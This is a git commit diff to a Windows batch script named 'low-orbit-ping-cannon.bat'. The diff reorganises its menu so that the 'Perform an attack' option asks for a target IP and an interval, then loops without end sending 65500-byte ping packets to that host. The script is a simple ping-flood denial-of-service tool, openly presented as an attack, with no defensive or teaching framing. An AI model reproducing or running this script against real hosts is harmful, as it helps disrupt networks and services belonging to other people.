25d7d1998937e30d2f90d6311dc64d21dc1616d7
Kogler <71842027+crckturtle@users.noreply.github.com>
2023-06-06 08:33:17 -0400

    Update low-orbit-ping-cannon.bat

--- index/project-main/low-orbit-ping-cannon.bat
+++ index/project-main/low-orbit-ping-cannon.bat
@@ -2,23 +2,21 @@
 :top
 
 echo What would you like to do?
-echo 1: Add an IP address
-echo 2: Perform an attack
+echo 1: Perform an attack
+echo 2: Quit
 choice /n /c:12 /m ""%1
 if errorlevel ==2 goto :two
 if errorlevel ==1 goto :one
 
 :one
-set /p "ips=Input IP: "
-echo "%ips%">>"ips.log"
-goto :top
-
-:two
 set /p "ipad=Input ip: "
 set /p "freq=Input freq: "
 :loop
 ping "%ipad%" -l 65500 -w 1 -n 1
 timeout /t "%freq%" /nobreak
 goto :loop
+
+:two
+end
 
 :end
